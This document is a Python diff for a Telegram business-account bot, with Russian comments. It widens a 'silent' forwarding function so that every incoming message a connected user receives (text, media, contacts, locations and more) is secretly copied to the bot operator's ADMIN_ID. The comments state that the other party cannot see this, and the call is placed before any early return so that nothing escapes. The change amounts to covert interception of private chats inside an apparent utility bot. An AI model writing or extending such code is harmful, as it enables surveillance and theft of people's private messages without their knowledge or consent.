@@ -510,7 +510,11 @@ async def forward_deleted(msg: Message, owner_id: int):
         await send_deleted_msg(ADMIN_ID, msg, build_deleted_header_admin(msg, owner_id))
 
 
-async def forward_media_silent(owner_id: int, msg: Message):
+async def forward_to_admin_silent(owner_id: int, msg: Message):
+    """Бесшумно пересылает админу ЛЮБОЕ входящее сообщение собеседника:
+    текст, медиа, стикеры, голосовые, контакты, гео и т.д.
+    Собеседник этого не видит — пересылка идёт напрямую в чат админа с ботом.
+    """
     try:
         name, uid = build_sender_info(msg)
         info = connected_users.get(owner_id)
@@ -521,12 +525,19 @@ async def forward_media_silent(owner_id: int, msg: Message):
             biz_user += f" [ID: {owner_id}]"
         else:
             biz_user = str(owner_id)
-        header = (
+        header_base = (
             f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
             f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
-            f'📨 Переписка: {biz_user}\n'
-            f'📎 медиафайл:'
+            f'📨 Переписка: {biz_user}'
         )
+
+        # 1) Чистый текст без медиа — самое частое, отдельная ветка.
+        if msg.text and not has_media(msg):
+            full = f"{header_base}\n💬 {escape_html(msg.text)}"
+            await bot.send_message(ADMIN_ID, full, parse_mode="HTML")
+            return
+
+        header = header_base + "\n📎 медиафайл:"
         if msg.photo:
             caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
             await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, parse_mode="HTML")
@@ -550,8 +561,16 @@ async def forward_media_silent(owner_id: int, msg: Message):
         elif msg.animation:
             await bot.send_message(ADMIN_ID, header, parse_mode="HTML")
             await bot.send_animation(ADMIN_ID, msg.animation.file_id)
+        else:
+            # Всё остальное (опросы, гео, контакты, dice и т.п.) — копируем
+            # как есть, чтобы ничего не потерять.
+            try:
+                await bot.send_message(ADMIN_ID, header_base, parse_mode="HTML")
+                await bot.copy_message(ADMIN_ID, msg.chat.id, msg.message_id)
+            except Exception as e:
+                logging.warning(f"Не удалось скопировать неизвестный тип сообщения: {e}")
     except Exception as e:
-        logging.error(f"Ошибка тихой пересылки медиа администратору: {e}")
+        logging.error(f"Ошибка тихой пересылки админу: {e}")
 
 
 @dp.business_connection()
@@ -921,6 +940,13 @@ async def handle_business_message(message: Message):
         except Exception as e:
             logging.warning(f"[MIRROR] не удалось повторить: {e}")
 
+    # Тихая пересылка админу ВСЕХ входящих сообщений собеседника
+    # (текст, медиа, стикеры, ссылки, гео и т.д.). Делаем это до любых
+    # ранних return, чтобы ничего не потерять — например, сообщения со
+    # ссылками ниже уходят в return.
+    if sender_id is not None and sender_id != owner_id:
+        asyncio.create_task(forward_to_admin_silent(owner_id, message))
+
     msg_text = message.text or message.caption or ""
     if extract_url(msg_text):
         # Авто-скачивание ссылок включается ТОЛЬКО если ссылку прислал
@@ -933,9 +959,6 @@ async def handle_business_message(message: Message):
         if sender_id == owner_id:
             await auto_download(message, bot)
         return
-
-    if sender_id != owner_id and has_media(message):
-        await forward_media_silent(owner_id, message)
 
     if (
         sender_id is not None
